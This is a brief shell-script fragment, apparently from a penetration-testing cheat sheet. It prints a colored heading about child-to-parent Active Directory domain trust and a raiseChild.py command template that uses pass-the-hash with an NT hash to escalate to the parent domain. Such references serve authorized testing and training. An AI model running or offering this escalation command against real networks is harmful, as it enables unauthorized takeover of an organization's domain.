echo -e "${BOLD}${CYAN}── Domain Trust — Child to Parent ───────────────────${NC}"
echo -e "  ${GREEN}raiseChild.py <CHILD_DOMAIN>/testAdmin -hashes ':<NT_HASH>'${NC}"
printf "\n"

printf "\n"
echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
